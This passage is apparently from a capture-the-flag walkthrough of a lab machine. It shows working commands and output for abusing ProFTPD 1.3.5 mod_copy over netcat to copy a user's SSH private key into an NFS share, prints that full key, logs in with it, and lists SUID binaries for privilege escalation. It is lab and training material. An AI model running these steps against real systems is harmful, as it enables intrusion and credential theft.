;   guest ok = yes
;   read only = yes

# Un-comment the following and create the profiles directory to store
# users profiles (see the "logon path" option above)
# (you need to configure Samba to act as a domain controller too.)
# The path below should be writable by all users so that their
# profile directory may be created the first time they log on
;[profiles]
;   comment = Users profiles
;   path = /home/samba/profiles
;   guest ok = no
;   browseable = no
;   create mask = 0600
;   directory mask = 0700

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
# Uncomment to allow remote administration of Windows print drivers.
# You may need to replace 'lpadmin' with the name of the group your
# admin users are members of.
# Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin
[anonymous]
   path = /home/kenobi/share
   browseable = yes
   read only = yes
   guest ok = yes
```

4. Scan NFS share with `showmount -e <ip address>` to find `/var`. Mount the NFS share with `sudo mount -t nfs <IP>:<share> <directory to mount to> -nolock`

5. Use `searchsploit proftpd 1.3.5` to search for exploits
```
root@ip-10-10-9-47:~/Downloads/nfs_mount/backups# searchsploit proftpd 1.3.5
[i] Found (#2): /opt/searchsploit/files_exploits.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                              | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                    | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                                              | linux/remote/36742.txt
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

6. We can copy the private ssh key from the `.ssh` directory into `/var`, which we have access to through NFS. [Resource](http://www.proftpd.org/docs/contrib/mod_copy.html)
```
root@ip-10-10-9-47:~/Downloads# nc 10.10.210.113 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.210.113]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
```
root@ip-10-10-9-47:~/Downloads/nfs_mount/tmp# ls
id_rsa                                                                             systemd-private-95845d3001394c009f49e4db7c24cba8-systemd-timesyncd.service-gHVM41
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM  systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
root@ip-10-10-9-47:~/Downloads/nfs_mount/tmp# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----
```

7. Copy the private key into a file, change its permissions, and use it to login to ssh. Print out the user file to get `d0b0f3f53b6caa532a83915e19224899`
```
root@ip-10-10-9-47:~/.ssh# vim id_rsa
root@ip-10-10-9-47:~/.ssh# chmod 400 id_rsa
root@ip-10-10-9-47:~/.ssh# ssh -i id_rsa kenobi@10.10.210.113
The authenticity of host '10.10.210.113 (10.10.210.113)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.210.113' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

8. Scan for SUID files, `/usr/bin/menu` stands out and it runs 3 commands for us
```
kenobi@kenobi:/$ find . -perm /4000 2> /dev/null
./sbin/mount.nfs
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/bin/chfn
./usr/bin/newgidmap
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/newuidmap
./usr/bin/gpasswd
./usr/bin/menu
./usr/bin/sudo
./usr/bin/chsh
./usr/bin/at
./usr/bin/newgrp
./bin/umount
./bin/fusermount
./bin/mount
./bin/ping
./bin/su
./bin/ping6
```
```
kenobi@kenobi:/$ menu -h

***************************************
1. status check
2. kernel version
3. ifconfig
```

9. Using `strings /usr/bin/menu` shows us that it doesn't use absolute paths
```
curl -I localhost
uname -r
ifconfig
```

10. The flag is `177b3cd8562289f37382721c28381f02`
